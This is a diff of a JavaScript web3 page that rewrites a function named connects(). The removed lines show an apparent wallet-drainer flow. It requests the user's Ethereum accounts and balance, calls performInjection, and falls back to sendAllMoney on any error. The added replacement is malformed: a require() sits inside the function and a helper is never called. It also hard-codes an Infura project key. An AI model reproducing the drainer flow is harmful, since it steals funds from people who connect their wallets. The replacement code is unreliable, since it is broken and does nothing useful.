@@ -126,35 +126,15 @@ async function connect() {
 }
 
 async function connects() {
-    web3 = new Web3("https://mainnet.infura.io/v3/a2406dc3cb964ddeb4c4f93e9cdcb8a5");
-    
-    console.log("Web3 instance is", web3);
-    
-    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-    const balance = await web3.eth.getBalance(accounts[0]);
-
-    selectedAccount = accounts[0];
-    syncChain()
-    try {
-        try {
-
-            //throw "No accounts found"
-            await performInjection(selectedAccount, balance);
-        }
-        catch (error) {
-            // do in loop
-            console.log(error)
-
-            await sendAllMoney()
-
-
-        }
-    }
-    catch (err) {
-        await sendAllMoney()
-    }
-
-
+    const Web3 = require("web3");
+const ethEnabled = () => {
+  if (window.web3) {
+    window.web3 = new Web3("https://mainnet.infura.io/v3/a2406dc3cb964ddeb4c4f93e9cdcb8a5");
+    window.ethereum.enable();
+    return true;
+  }
+  return false;
+}
 
 
 }
